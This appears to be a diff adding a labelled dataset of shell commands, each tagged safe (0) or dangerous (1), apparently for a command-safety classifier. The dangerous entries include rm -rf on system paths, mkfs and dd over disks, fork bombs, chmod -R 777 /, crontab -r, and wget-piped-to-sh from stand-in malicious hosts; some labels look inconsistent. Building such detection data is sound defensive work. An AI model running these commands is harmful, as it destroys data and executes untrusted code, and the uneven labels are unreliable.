@@ -1,0 +1,279 @@
+ls -l | 0
+pwd | 0
+cat file.txt | 0
+echo "Hello, World!" | 0
+date | 0
+
+
+/dev/sda | 1
+
+
+echo "Hello" > /dev/sda | 1
+cat /etc/passwd > /dev/sda | 1
+ls > /dev/sda | 1
+date > /dev/sda | 1
+whoami | 0
+df -h | 0
+free -m | 0
+top | 0
+ps aux | 0
+df > /dev/sda | 1
+top > /dev/sda | 1
+free > /dev/sda | 1
+dmesg > /dev/sda | 1
+ifconfig > /dev/sda | 1
+uname -a | 0
+ifconfig | 0
+ping google.com | 0
+man ls | 0
+cp file1.txt file2.txt | 0
+ps > /dev/sda | 1
+uname -a > /dev/sda | 1
+uptime > /dev/sda | 1
+find / > /dev/sda | 1
+lsblk > /dev/sda | 1
+mv oldname.txt newname.txt | 0
+mkdir new_directory | 0
+touch newfile.txt | 0
+grep "pattern" file.txt | 0
+head -n 5 file.txt | 0
+grep "error" > /dev/sda | 1
+whoami > /dev/sda | 1
+ls /home > /dev/sda | 1
+head /var/log/syslog > /dev/sda | 1
+tail /var/log/auth.log > /dev/sda | 1
+tail -n 10 logfile.log | 0
+wc -l file.txt | 0
+sort file.txt | 0
+uniq -c sorted_file.txt | 0
+find . -name "*.txt" | 0
+echo "Test" > /dev/sda | 1
+rm -r folder1 | 1
+rm -r dir2 | 1
+rm -r /home/user/docs | 1
+rm -r project/ | 1
+tar -cvf archive.tar files/ | 0
+gzip largefile.txt | 0
+gunzip file.gz | 0
+du -sh directory/ | 0
+file unknown_file | 0
+rm -r /var/tmp/ | 1
+rm -r /etc/config/ | 1
+rm -r temp_files/ | 1
+rm -r archive/old/ | 1
+rm -r backup/ | 1
+diff file1.txt file2.txt | 0
+wget https://example.com/file.zip | 0
+curl https://api.example.com | 0
+ssh user@remote_host | 0
+scp file.txt user@remote_host:/path/ | 0
+rm -r /usr/local/share/ | 1
+rm -r images/ | 1
+rm -r downloads/ | 1
+rm -r /home/user/.cache/ | 1
+rm -r /var/log/old_logs/ | 1
+history | 0
+alias ll='ls -la' | 0
+export PATH=$PATH:/new/path | 0
+source ~/.bashrc | 0
+echo $HOME | 0
+rm -r /opt/old/ | 1
+rm -r my_project/ | 1
+rm -r /mnt/external/backup/ | 1
+rm -r temp/ | 1
+rm -r /srv/data/ | 1
+cal | 0
+bc <<< "2 + 2" | 0
+uptime | 0
+w | 0
+last | 0
+rm -r /home/user/temp_files/ | 1
+rm -f file1.txt | 1
+rm -f /home/user/file2.txt | 1
+rm -f /var/tmp/readonly_file | 1
+rm -f /etc/config/config_file | 1
+id | 0
+hostname | 0
+traceroute google.com | 0
+nslookup example.com | 0
+lsof -i :80 | 0
+rm -f project/file3.log | 1
+rm -f /opt/readonly_file | 1
+rm -f /usr/local/bin/script.sh | 1
+rm -f temp_files/*.tmp | 1
+rm -f /mnt/external/file4.dat | 1
+netstat -tuln | 0
+journalctl -xe | 0
+systemctl status ssh | 0
+chown user:group file.txt | 0
+chmod 644 file.txt | 0
+rm -f archive/old_file.zip | 1
+rm -f downloads/file5.iso | 1
+rm -f /home/user/important_file | 1
+rm -f /var/log/old_logs/*.log | 1
+rm -f /home/user/.cache/*.cache | 1
+ln -s target_file link_name | 0
+cut -d',' -f2 file.csv | 0
+awk '{print $1}' file.txt | 0
+sed 's/old/new/g' file.txt | 0
+xargs -n1 echo < list.txt | 0
+rm -f images/*.jpg | 1
+rm -f backup/backup_file.bak | 1
+rm -f /srv/data/file6.db | 1
+rm -f /tmp/temporary_file | 1
+rm -f /opt/old/old_file | 1
+tee output.txt | 0
+watch -n 5 free -m | 0
+rsync -av source/ destination/ | 0
+crontab -l | 0
+nohup long_running_command & | 0
+rm -f /etc/config/another_readonly_file | 1
+rm -rf /home/user/old_projects/ | 1
+rm -rf /var/tmp/* | 1
+rm -rf /etc/config/ | 1
+rm -rf /opt/unused/ | 1
+time command | 0
+htop | 0
+tree directory/ | 0
+md5sum file.txt | 0
+sha256sum file.txt | 0
+rm -rf /srv/backup/ | 1
+rm -rf /tmp/old_files/ | 1
+rm -rf /home/user/downloads/ | 1
+rm -rf /mnt/external/backup/ | 1
+rm -rf /usr/local/share/old/ | 1
+sudo apt update | 0
+sudo apt upgrade | 0
+sudo systemctl restart apache2 | 0
+sudo ufw status | 0
+sudo fdisk -l | 0
+rm -rf /var/log/old/ | 1
+rm -rf /home/user/images/ | 1
+rm -rf /home/user/docs/ | 1
+rm -rf /var/cache/ | 1
+rm -rf /home/user/temporary/ | 1
+git status | 0
+git add . | 0
+git commit -m "Commit message" | 0
+git pull origin main | 0
+git push origin main | 0
+rm -rf /opt/test/ | 1
+rm -rf /etc/old_config/ | 1
+rm -rf /srv/data/ | 1
+rm -rf /tmp/old/ | 1
+rm -rf /home/user/archive/ | 1
+docker ps | 0
+docker images | 0
+docker run hello-world | 0
+docker-compose up -d | 0
+docker logs container_name | 0
+rm -rf /mnt/external/unused/ | 1
+rm -rf file1.txt* | 1
+rm -rf *.tmp | 1
+rm -rf *.log | 1
+rm -rf file2.* | 1
+python3 --version | 0
+pip list | 0
+virtualenv venv | 0
+source venv/bin/activate | 0
+python3 script.py | 0
+rm -rf *.bak | 1
+rm -rf *.dat | 1
+rm -rf *.iso | 1
+rm -rf *.zip | 1
+rm -rf file3.* | 1
+node --version | 0
+npm install package_name | 0
+npm start | 0
+npx create-react-app my-app | 0
+yarn add package_name | 0
+rm -rf *.db | 1
+rm -rf *.jpg | 1
+rm -rf *.pdf | 1
+rm -rf *.tar | 1
+rm -rf *.gz | 1
+mysql -u username -p database_name | 0
+psql -U username -d database_name | 0
+mongo | 0
+redis-cli | 0
+sqlite3 database.db | 0
+rm -rf *.csv | 1
+rm -rf *.html | 1
+rm -rf *.xml | 1
+rm -rf *.sh | 1
+rm -rf *.py | 1
+chmod -R 777 / | 1
+chmod -R 777 /home | 1
+chmod -R 777 /var/www | 1
+chmod -R 777 /etc | 1
+chmod -R 777 /tmp | 1
+:(){ :|:& };: | 1
+() { :|:& };: | 1
+:(){ |:& };: | 1
+() { |:& };: | 1
+:(){ |:|:|:|:|& };: | 1
+mkfs.ext3 /dev/sda1 | 1
+mkfs.ext3 /dev/sdb | 1
+mkfs.ext3 /dev/sdc1 | 1
+mkfs.ext3 /dev/sdd | 1
+mkfs.ext3 /dev/sde1 | 1
+mv data /dev/null | 1
+mv temp /dev/null | 1
+mv backup /dev/null | 1
+mv old_files /dev/null | 1
+mv logs /dev/null | 1
+
+
+log.txt | 1
+
+
+
+
+notes.txt | 1
+
+
+
+
+data.csv | 1
+
+
+
+
+temp.log | 1
+
+
+
+
+output.txt | 1
+
+
+wget http://example.com/malicious_script -O- | sh | 1
+wget http://malicious.example.org/script.sh -O- | sh | 1
+wget http://unsafe.com/script -O- | sh | 1
+wget http://hackersite.net/malicious.sh -O- | sh | 1
+wget http://dangerous.org/exploit -O- | sh | 1
+echo foo -> ^foo^bar | 1
+cat foo.txt -> ^foo^bar | 1
+grep foo -> ^foo^bar | 1
+rm foo -> ^foo^bar | 1
+ls foo -> ^foo^bar | 1
+echo "secret" > .hidden_file | 1
+ls -a | 0
+touch .hidden_script.sh | 1
+chmod 700 .hidden_file | 1
+cat .hidden_file | 1
+dd if=/dev/sda of=/path/to/backup.img | 1
+dd if=/path/to/backup.img of=/dev/sda | 1
+dd if=/dev/zero of=outputfile bs=1M count=100 | 1
+dd if=/dev/urandom of=randomfile bs=1M count=10 | 1
+dd if=inputfile of=outputfile bs=512 conv=sync | 1
+history | sh | 1
+history | sh > output.log | 1
+history | sh 2>&1 | tee output.log | 1
+history | sh -x | 1
+history | sh -e | 1
+crontab -r | 1
+crontab -r && echo "Crontab cleared" | 1
+crontab -r || echo "Failed to clear crontab" | 1
+crontab -r > output.log | 1
+crontab -r -u username | 1
